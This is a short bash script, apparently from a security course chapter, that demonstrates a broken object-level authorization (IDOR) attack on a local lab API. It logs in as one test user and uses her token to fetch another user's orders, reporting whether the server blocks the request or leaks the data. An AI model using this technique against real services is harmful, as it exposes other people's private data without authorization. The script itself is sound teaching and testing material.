#!/usr/bin/env bash
#
# Chapter 22 — BOLA on /api/users/{id}/orders
#
# 1. Login as alice (USER role)
# 2. Use her token to request bob's order history
#    - Vulnerable controller: returns bob's orders (cross-tenant data leak)
#    - Fixed controller:      403 Forbidden

set -euo pipefail
API="${API:-http://localhost:8080}"

bold() { printf '\033[1m%s\033[0m\n' "$*"; }
gray() { printf '\033[90m%s\033[0m\n' "$*"; }

ALICE_ID='11111111-1111-1111-1111-111111111111'
BOB_ID='22222222-2222-2222-2222-222222222222'

bold "[1/2] Login as alice@example.com"
LOGIN=$(curl -sS -X POST "${API}/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"alice@example.com","password":"alice123!"}')
TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
gray "  Got token for alice (id=${ALICE_ID})"
echo

bold "[2/2] Use alice's token to request BOB's orders"
gray "  GET ${API}/api/users/${BOB_ID}/orders"
RESPONSE=$(curl -sS -o /tmp/resp.json -w '%{http_code}' \
  -H "Authorization: Bearer ${TOKEN}" \
  "${API}/api/users/${BOB_ID}/orders")
echo "  HTTP ${RESPONSE}"
echo "  Body: $(cat /tmp/resp.json)"
echo

if [ "$RESPONSE" = "403" ]; then
  bold "ATTACK BLOCKED — server enforced ownership check."
elif [ "$RESPONSE" = "200" ]; then
  bold "ATTACK SUCCEEDED — alice retrieved bob's order history."
  echo "  This is BOLA / IDOR — OWASP API Top 10 #1."
  exit 1
else
  bold "Unexpected response (${RESPONSE}). Is the backend running?"
  exit 2
fi
